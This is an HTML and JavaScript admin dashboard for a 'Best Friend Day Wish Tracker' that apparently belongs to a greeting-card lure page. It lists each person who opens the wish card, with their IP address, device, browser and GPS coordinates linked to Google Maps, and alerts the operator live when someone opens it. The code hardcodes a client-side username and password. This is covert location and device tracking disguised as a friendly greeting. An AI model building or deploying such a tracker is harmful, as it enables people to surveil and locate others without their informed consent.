<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin — Best Friend Wish Tracker</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Dancing+Script:wght@700&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --gold:#F5C842;--rose:#FF6B9D;--lilac:#C084FC;--sky:#67C8FF;--green:#4ade80;
  --midnight:#0D0120;--panel:#130E2A;--card:#1C1535;--card2:#211945;
  --border:rgba(255,255,255,.08);--text:#EDE8FF;--muted:#8B78B8;
}
body{font-family:'Inter',sans-serif;background:var(--midnight);color:var(--text);min-height:100vh}
body::before{content:'';position:fixed;inset:0;z-index:-1;background:radial-gradient(ellipse at 15% 20%,rgba(192,132,252,.1) 0%,transparent 50%),radial-gradient(ellipse at 85% 80%,rgba(255,107,157,.08) 0%,transparent 50%),var(--midnight)}

/* ── LOGIN ── */
.login-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
.login-box{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:36px 28px;width:100%;max-width:360px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.login-box .logo{font-size:2.8rem;margin-bottom:8px;display:block}
.login-box h2{font-family:'Dancing Script',cursive;font-size:1.8rem;color:var(--gold);margin-bottom:4px}
.login-box p{font-size:.82rem;color:var(--muted);margin-bottom:28px}
.lf{margin-bottom:14px;text-align:left}
.lf label{font-size:.78rem;color:var(--muted);display:block;margin-bottom:6px}
.lf input{width:100%;padding:12px 14px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:.92rem;outline:none;font-family:'Inter',sans-serif;transition:border-color .2s}
.lf input:focus{border-color:rgba(245,200,66,.4)}
.login-btn{width:100%;padding:13px;background:linear-gradient(135deg,var(--gold),#F09A1A);border:none;border-radius:12px;color:#1A0533;font-size:.95rem;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;margin-top:6px;transition:opacity .2s}
.login-btn:hover{opacity:.9}
.login-err{color:var(--rose);font-size:.78rem;margin-top:10px;display:none}

/* ── HEADER ── */
.header{background:rgba(19,14,42,.95);border-bottom:1px solid var(--border);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50;backdrop-filter:blur(12px)}
.htitle{font-family:'Dancing Script',cursive;font-size:1.4rem;color:var(--gold)}
.hsub{font-size:.68rem;color:var(--muted);margin-top:1px}
.live-pill{display:flex;align-items:center;gap:5px;background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.25);border-radius:20px;padding:4px 12px;font-size:.7rem;color:var(--green)}
.live-dot{width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.logout-btn{padding:7px 14px;background:transparent;border:1px solid var(--border);border-radius:8px;color:var(--muted);font-size:.74rem;cursor:pointer;font-family:'Inter',sans-serif}

/* ── STATS ── */
.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:16px}
.sc{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;position:relative;overflow:hidden}
.sl{font-size:.65rem;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);margin-bottom:6px}
.sv{font-size:1.8rem;font-weight:700}
.sv.gold{color:var(--gold)}.sv.rose{color:var(--rose)}.sv.lilac{color:var(--lilac)}.sv.sky{color:var(--sky)}.sv.green{color:var(--green)}
.se{position:absolute;top:12px;right:14px;font-size:1.4rem;opacity:.45}

/* ── SEC HEADER ── */
.sec-head{padding:4px 16px 10px;display:flex;align-items:center;justify-content:space-between}
.sec-head h3{font-size:.7rem;text-transform:uppercase;letter-spacing:.1em;color:var(--rose);font-weight:600}
.btns-row{display:flex;gap:6px}
.icon-btn{padding:5px 12px;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:7px;color:var(--muted);font-size:.72rem;cursor:pointer;font-family:'Inter',sans-serif}
.icon-btn:hover{color:var(--text)}
.clear-btn{padding:5px 12px;background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.2);border-radius:7px;color:#f87171;font-size:.72rem;cursor:pointer;font-family:'Inter',sans-serif}

/* ── VISIT CARDS ── */
.vlist{padding:0 16px 80px}
.empty{text-align:center;padding:60px 20px;color:var(--muted)}
.empty .big{font-size:3rem;margin-bottom:12px}
.empty p{font-size:.88rem;line-height:1.7}

.vc{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:18px 16px;margin-bottom:12px;position:relative;overflow:hidden;transition:border-color .3s}
.vc.fresh{border-color:rgba(245,200,66,.5);animation:freshGlow 4s ease-out forwards}
@keyframes freshGlow{0%{box-shadow:0 0 0 3px rgba(245,200,66,.35)}100%{box-shadow:none;border-color:var(--border)}}
.vc::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(to right,transparent,rgba(245,200,66,.4),transparent)}

.vc-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
.vc-num{font-size:.65rem;font-weight:700;color:var(--gold);background:rgba(245,200,66,.1);border:1px solid rgba(245,200,66,.2);border-radius:8px;padding:3px 9px}
.vc-time{font-size:.7rem;color:var(--muted)}
.new-tag{font-size:.62rem;font-weight:700;background:rgba(255,107,157,.15);border:1px solid rgba(255,107,157,.3);border-radius:8px;padding:3px 8px;color:var(--rose)}

/* INFO ROWS */
.info-block{background:var(--card2);border-radius:10px;padding:12px 14px;margin-bottom:8px}
.ib-title{font-size:.62rem;text-transform:uppercase;letter-spacing:.1em;color:var(--rose);margin-bottom:8px;font-weight:600}
.ir{display:flex;align-items:flex-start;gap:10px;padding:4px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:.82rem}
.ir:last-child{border-bottom:none}
.ir .lbl{color:var(--muted);min-width:86px;flex-shrink:0;font-size:.78rem}
.ir .val{color:var(--text);word-break:break-all;line-height:1.4}
.ir .val.ip{font-family:monospace;color:var(--sky);background:rgba(103,200,255,.07);border-radius:5px;padding:1px 7px;font-size:.82rem}
.ir .val.name-hl{color:var(--gold);font-weight:600;font-size:.88rem}
.ir .val.ua{color:#8B78B8;font-size:.72rem}
.ir .val.coord{font-family:monospace;font-size:.78rem;color:#C084FC}

/* GPS OPEN MAP BTN */
.map-btn{display:inline-flex;align-items:center;gap:6px;padding:6px 12px;background:rgba(103,200,255,.08);border:1px solid rgba(103,200,255,.25);border-radius:8px;color:var(--sky);font-size:.75rem;text-decoration:none;margin-top:6px;font-family:'Inter',sans-serif;transition:background .2s}
.map-btn:hover{background:rgba(103,200,255,.15)}
.no-gps{font-size:.75rem;color:#6B5A8A;font-style:italic}

/* ── TOAST ── */
.toast{position:fixed;bottom:20px;left:16px;right:16px;background:linear-gradient(135deg,#2D1A5E,#1E1040);border:1px solid rgba(245,200,66,.4);border-radius:14px;padding:14px 16px;display:flex;align-items:center;gap:12px;box-shadow:0 8px 40px rgba(0,0,0,.6);z-index:200;transform:translateY(120%);transition:transform .45s cubic-bezier(.34,1.56,.64,1)}
.toast.show{transform:translateY(0)}
.t-icon{font-size:1.8rem;flex-shrink:0}
.t-title{font-size:.85rem;font-weight:600;color:var(--gold)}
.t-sub{font-size:.75rem;color:var(--muted);margin-top:2px}
.t-sub2{font-size:.72rem;color:var(--sky);margin-top:2px;font-family:monospace}
.t-close{background:rgba(255,255,255,.08);border:none;border-radius:6px;padding:5px 9px;color:var(--muted);font-size:.8rem;cursor:pointer}

.main{display:none}.main.visible{display:block}
.login-screen.hidden{display:none}
</style>
</head>
<body>

<!-- LOGIN -->
<div class="login-screen" id="ls">
  <div class="login-box">
    <span class="logo">💛</span>
    <h2>Admin Access</h2>
    <p>Best Friend Day — Wish Tracker</p>
    <div class="lf"><label>Username</label><input type="text" id="lu" placeholder="admin" /></div>
    <div class="lf"><label>Password</label><input type="password" id="lp" placeholder="••••••••" onkeydown="if(event.key==='Enter')doLogin()" /></div>
    <button class="login-btn" onclick="doLogin()">Enter Panel →</button>
    <div class="login-err" id="lerr">Wrong credentials. Try again.</div>
  </div>
</div>

<!-- MAIN -->
<div class="main" id="main">

  <div class="header">
    <div>
      <div class="htitle">💛 Wish Tracker</div>
      <div class="hsub">Best Friend Day · Live Admin Panel</div>
    </div>
    <div style="display:flex;gap:8px;align-items:center">
      <div class="live-pill"><div class="live-dot"></div>Live</div>
      <button class="logout-btn" onclick="doLogout()">Logout</button>
    </div>
  </div>

  <!-- STATS -->
  <div class="stats">
    <div class="sc"><span class="se">👀</span><div class="sl">Total Visitors</div><div class="sv gold" id="s1">0</div></div>
    <div class="sc"><span class="se">💌</span><div class="sl">Wishes Opened</div><div class="sv rose" id="s2">0</div></div>
    <div class="sc"><span class="se">📍</span><div class="sl">IPs Captured</div><div class="sv lilac" id="s3">0</div></div>
    <div class="sc"><span class="se">🗺️</span><div class="sl">GPS Captured</div><div class="sv green" id="s4">0</div></div>
  </div>

  <!-- LIST -->
  <div class="sec-head">
    <h3>All Visitors</h3>
    <div class="btns-row">
      <button class="clear-btn" onclick="clearAll()">🗑 Clear</button>
      <button class="icon-btn" onclick="loadVisits()">↻ Refresh</button>
    </div>
  </div>

  <div class="vlist" id="vlist"></div>
</div>

<!-- TOAST -->
<div class="toast" id="toast">
  <div class="t-icon">💌</div>
  <div style="flex:1">
    <div class="t-title">Someone opened the wish!</div>
    <div class="t-sub" id="tName">—</div>
    <div class="t-sub2" id="tIP">IP: —</div>
  </div>
  <button class="t-close" onclick="closeToast()">✕</button>
</div>

<script>
const U='Aqib', P='aqib.125'; // Change password!

function doLogin(){
  if(document.getElementById('lu').value===U&&document.getElementById('lp').value===P){
    document.getElementById('ls').classList.add('hidden');
    document.getElementById('main').classList.add('visible');
    loadVisits();startPolling();
  } else {document.getElementById('lerr').style.display='block'}
}
function doLogout(){
  document.getElementById('ls').classList.remove('hidden');
  document.getElementById('main').classList.remove('visible');
  document.getElementById('lu').value='';document.getElementById('lp').value='';
  document.getElementById('lerr').style.display='none';
}

let allV=[];let lastCount=0;

function loadVisits(){
  allV=JSON.parse(localStorage.getItem('bf_visits')||'[]');
  updateStats();renderVisits();
}

function updateStats(){
  document.getElementById('s1').textContent=allV.length;
  document.getElementById('s2').textContent=allV.length;
  document.getElementById('s3').textContent=new Set(allV.map(v=>v.ip)).size;
  document.getElementById('s4').textContent=allV.filter(v=>v.location&&v.location.lat&&v.location.lat!=='N/A'&&v.location.lat!=='Denied').length;
}

function renderVisits(freshIdx=-1){
  const list=document.getElementById('vlist');
  if(!allV.length){
    list.innerHTML=`<div class="empty"><div class="big">💌</div><p>No visitors yet.<br>Share the wish link and watch<br>your friends appear here in real time.</p></div>`;
    return;
  }
  list.innerHTML=allV.map((v,i)=>{
    const t=new Date(v.visitedAt);
    const dateStr=t.toLocaleDateString('en-PK',{day:'2-digit',month:'short',year:'numeric'});
    const timeStr=t.toLocaleTimeString('en-PK',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
    const isFresh=i===freshIdx;
    const isNew=(Date.now()-t.getTime())<20000;
    const gps=v.location||{};
    const hasGPS=gps.lat&&gps.lat!=='N/A'&&gps.lat!=='Denied';

    return `
    <div class="vc ${isFresh?'fresh':''}">
      <div class="vc-head">
        <span class="vc-num">Visit #${allV.length-i}</span>
        ${isNew?'<span class="new-tag">🔴 Just Now</span>':''}
        <span class="vc-time">${dateStr} · ${timeStr}</span>
      </div>

      <!-- SENDER INFO -->
      <div class="info-block">
        <div class="ib-title">👤 Sender Info</div>
        <div class="ir"><span class="lbl">Sender Name</span><span class="val name-hl">💛 ${v.senderName||'Unknown'}</span></div>
        <div class="ir"><span class="lbl">Opened At</span><span class="val">${dateStr} at ${timeStr}</span></div>
        <div class="ir"><span class="lbl">Action</span><span class="val" style="color:var(--green)">💌 Opened the Wish Card</span></div>
      </div>

      <!-- NETWORK INFO -->
      <div class="info-block">
        <div class="ib-title">🌐 Network & Device</div>
        <div class="ir"><span class="lbl">IP Address</span><span class="val ip">${v.ip||'Unknown'}</span></div>
        <div class="ir"><span class="lbl">Device</span><span class="val ua">${parseDevice(v.userAgent)}</span></div>
        <div class="ir"><span class="lbl">Browser</span><span class="val ua">${parseBrowser(v.userAgent)}</span></div>
      </div>

      <!-- GPS LOCATION -->
      <div class="info-block">
        <div class="ib-title">📍 GPS Location</div>
        ${hasGPS?`
          <div class="ir"><span class="lbl">Latitude</span><span class="val coord">${gps.lat}</span></div>
          <div class="ir"><span class="lbl">Longitude</span><span class="val coord">${gps.lng}</span></div>
          <div class="ir"><span class="lbl">Accuracy</span><span class="val">${gps.accuracy}</span></div>
          <a href="${gps.mapsLink}" target="_blank" class="map-btn">🗺️ Open in Google Maps</a>
        `:`
          <div class="no-gps">
            ${gps.error==='Not supported'?'⚠️ GPS not supported on this device':'⚠️ Location permission was denied by the user'}
          </div>
        `}
      </div>
    </div>
    `;
  }).join('');
}

function parseDevice(ua){
  if(!ua||ua==='Unknown')return'Unknown Device';
  if(/iPhone/.test(ua))return'📱 iPhone';
  if(/Android/.test(ua)&&/Mobile/.test(ua))return'📱 Android Phone';
  if(/Android/.test(ua))return'📱 Android Tablet';
  if(/iPad/.test(ua))return'📱 iPad';
  if(/Mac/.test(ua))return'💻 MacBook / Mac';
  if(/Windows/.test(ua))return'🖥 Windows PC';
  if(/Linux/.test(ua))return'🖥 Linux PC';
  return'🖥 Unknown Device';
}
function parseBrowser(ua){
  if(!ua)return'Unknown';
  if(/CriOS/.test(ua))return'Chrome (iOS)';
  if(/FxiOS/.test(ua))return'Firefox (iOS)';
  if(/EdgA/.test(ua))return'Edge (Android)';
  if(/Chrome/.test(ua)&&/Safari/.test(ua))return'Chrome';
  if(/Firefox/.test(ua))return'Firefox';
  if(/Safari/.test(ua))return'Safari';
  if(/Edge/.test(ua))return'Edge';
  return'Unknown Browser';
}

function clearAll(){
  if(confirm('Delete all visitor records? This cannot be undone.')){
    localStorage.removeItem('bf_visits');
    allV=[];lastCount=0;updateStats();renderVisits();
  }
}

// ── LIVE POLLING ──────────────────────────────────────
function startPolling(){
  lastCount=allV.length;
  setInterval(()=>{
    const fresh=JSON.parse(localStorage.getItem('bf_visits')||'[]');
    if(fresh.length>lastCount){
      allV=fresh;lastCount=fresh.length;
      updateStats();renderVisits(0);
      showToast(fresh[0]);
    }
  },1500);
}

window.addEventListener('bf_visit',e=>{
  const v=e.detail;
  if(!allV.find(x=>x.visitedAt===v.visitedAt)){
    allV.unshift({...v,userAgent:navigator.userAgent});
    lastCount=allV.length;
    updateStats();renderVisits(0);showToast(allV[0]);
  }
});

let tTimer;
function showToast(v){
  document.getElementById('tName').textContent='From: '+(v.senderName||'Unknown');
  document.getElementById('tIP').textContent='IP: '+(v.ip||'—');
  document.getElementById('toast').classList.add('show');
  clearTimeout(tTimer);tTimer=setTimeout(()=>document.getElementById('toast').classList.remove('show'),8000);
  try{
    const c=new(window.AudioContext||window.webkitAudioContext)();
    [[784,.12],[1047,.15]].forEach(([f,d],i)=>setTimeout(()=>{
      const o=c.createOscillator(),g=c.createGain();
      o.connect(g);g.connect(c.destination);
      o.type='sine';o.frequency.value=f;g.gain.value=.2;
      o.start();o.stop(c.currentTime+d);
    },i*180));
  }catch(e){}
}
function closeToast(){document.getElementById('toast').classList.remove('show')}
</script>
</body>
</html>
